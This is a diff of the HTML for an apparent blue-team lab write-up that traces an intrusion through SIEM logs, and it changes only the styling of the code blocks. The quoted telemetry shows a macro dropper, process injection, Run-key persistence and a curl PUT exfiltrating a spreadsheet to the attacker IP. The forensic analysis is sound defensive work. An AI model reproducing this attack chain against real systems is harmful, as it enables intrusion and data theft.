@@ -985,8 +985,8 @@
     
 </h3>
 <p>The Suricata NIDS alert at <strong>Nov 8, 2020, 22:30:49</strong> triggered on traffic between <strong>192.20.80.25</strong> (attacker) and <strong>192.168.10.15</strong> (patient zero, HD-FIN-03):</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)
-</span></span><span class="line"><span class="ln">2</span><span class="cl">Category: A Network Trojan was detected</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Category: A Network Trojan was detected</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1038,8 +1038,8 @@
     
 </h3>
 <p>Pivoting to process creation events on <code>192.168.10.15</code> and sorting chronologically revealed the full execution chain. At <strong>22:30:03</strong> WINWORD.EXE launched with the following command:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">&#34;C:\Program Files\Microsoft Office\Office15\WINWORD.EXE&#34; /n
-</span></span><span class="line"><span class="ln">2</span><span class="cl">&#34;C:\Users\nour.HACKDEFEND\Downloads\important_instructions.docx&#34; /o &#34;&#34;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&#34;C:\Program Files\Microsoft Office\Office15\WINWORD.EXE&#34; /n
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>&#34;C:\Users\nour.HACKDEFEND\Downloads\important_instructions.docx&#34; /o &#34;&#34;</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1054,8 +1054,8 @@
     data-zoom-src="/blue_team/cdef-qradar101/word_initial_access.png"></figure>
 </p>
 <p>The user <code>nour</code> opened <code>important_instructions.docx</code> (MD5: <code>9D08221599FCD9D35D11F9CBD6A0DEA3</code>) from the Downloads folder. The <code>/o &quot;&quot;</code> flag suppresses the splash screen, consistent with a document that auto-executes a macro on open. At <strong>22:30:51</strong> - 48 seconds after Word launched - a new process was created directly in the user&rsquo;s profile directory:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">C:\Users\nour.HACKDEFEND\FSETPBEUsIek.exe
-</span></span><span class="line"><span class="ln">2</span><span class="cl">MD5: 6F37EB2B7F6720B48588FB2B84ED17C8</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>C:\Users\nour.HACKDEFEND\FSETPBEUsIek.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>MD5: 6F37EB2B7F6720B48588FB2B84ED17C8</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1084,11 +1084,11 @@
 </p>
 <p>The random-looking name <code>FSETPBEUsIek.exe</code> dropped directly into the user&rsquo;s home folder is a strong indicator of a VBA macro dropper - Word macros commonly write and execute payloads to the current user&rsquo;s directory without requiring elevated privileges.</p>
 <p>At <strong>22:32:37</strong> <code>FSETPBEUsIek.exe</code> spawned <code>cmd.exe</code>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">C:\Windows\system32\cmd.exe
-</span></span><span class="line"><span class="ln">2</span><span class="cl">CurrentDirectory: C:\Users\nour.HACKDEFEND\
-</span></span><span class="line"><span class="ln">3</span><span class="cl">User: HACKDEFEND\nour</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>C:\Windows\system32\cmd.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>CurrentDirectory: C:\Users\nour.HACKDEFEND\
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>User: HACKDEFEND\nour</span></span></code></pre></div></div>
 <p>At <strong>22:35:04</strong> the executable wrote and executed a VBS script:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">FSETPBEUsIek.exe → C:\Users\NOUR~1.HAC\AppData\Local\Temp\uCOadJlMb.vbs</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>FSETPBEUsIek.exe → C:\Users\NOUR~1.HAC\AppData\Local\Temp\uCOadJlMb.vbs</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1103,8 +1103,8 @@
     data-zoom-src="/blue_team/cdef-qradar101/vba.png"></figure>
 </p>
 <p>At <strong>22:35:17</strong> <code>cscript.exe</code> executed the VBS script, which in turn dropped a secondary executable:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">C:\Windows\SysWOW64\cscript.exe
-</span></span><span class="line"><span class="ln">2</span><span class="cl">TargetFilename: C:\Users\NOUR~1.HAC\AppData\Local\Temp\radD54BD.tmp\FaFRuwJIlNvBNaT.exe</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>C:\Windows\SysWOW64\cscript.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>TargetFilename: C:\Users\NOUR~1.HAC\AppData\Local\Temp\radD54BD.tmp\FaFRuwJIlNvBNaT.exe</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Process Injection and Privilege Escalation</span>
     <div id="process-injection-and-privilege-escalation" class="anchor"></div>
@@ -1116,8 +1116,8 @@
     
 </h3>
 <p>At <strong>22:35:37</strong> a CreateRemoteThread event was logged - a process injects a thread into another process, which is the primary mechanism used by Meterpreter to migrate into a less suspicious host process:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Source: C:\Users\nour.HACKDEFEND\FSETPBEUsIek.exe
-</span></span><span class="line"><span class="ln">2</span><span class="cl">Target: C:\Windows\SysWOW64\notepad.exe</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Source: C:\Users\nour.HACKDEFEND\FSETPBEUsIek.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Target: C:\Windows\SysWOW64\notepad.exe</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1144,9 +1144,9 @@
 </h3>
 <p>On <strong>Nov 9, 2020, 09:51:45</strong> Suricata fired a second Metasploit payload alert - this time with source <code>192.20.80.25</code> and destination <code>192.168.20.20</code> (the Domain Controller), confirming the attacker pivoted laterally from HD-FIN-03 to the DC.</p>
 <p>Shortly after, at <strong>09:53:39</strong>, a Sysmon <strong>RegistryEvent (Value Set)</strong> (Event ID 13) was logged on the DC:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Image:         C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
-</span></span><span class="line"><span class="ln">2</span><span class="cl">Target Object: HKU\DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\SsGHOMcjsj
-</span></span><span class="line"><span class="ln">3</span><span class="cl">Target Details: C:\Windows\TEMP\PjvQTe.vbs</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Image:         C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Target Object: HKU\DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\SsGHOMcjsj
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>Target Details: C:\Windows\TEMP\PjvQTe.vbs</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1172,14 +1172,14 @@
     
 </h3>
 <p>Filtering events for the second victim host <code>192.168.10.29</code> and the attacker IP revealed a Suricata alert at <strong>Nov 9, 2020, 10:29:52</strong>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">ET INFO Dotted Quad Host XLSX Request
-</span></span><span class="line"><span class="ln">2</span><span class="cl">ET POLICY curl User-Agent Outbound</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>ET INFO Dotted Quad Host XLSX Request
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>ET POLICY curl User-Agent Outbound</span></span></code></pre></div></div>
 <p>Examining the payload of the associated HTTP connection confirmed active exfiltration:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">PUT /sami.xlsx
-</span></span><span class="line"><span class="ln">2</span><span class="cl">Host: 192.20.80.25
-</span></span><span class="line"><span class="ln">3</span><span class="cl">User-Agent: curl/7.55.1
-</span></span><span class="line"><span class="ln">4</span><span class="cl">Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
-</span></span><span class="line"><span class="ln">5</span><span class="cl">request_body_len: 43062</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>PUT /sami.xlsx
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Host: 192.20.80.25
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>User-Agent: curl/7.55.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>request_body_len: 43062</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
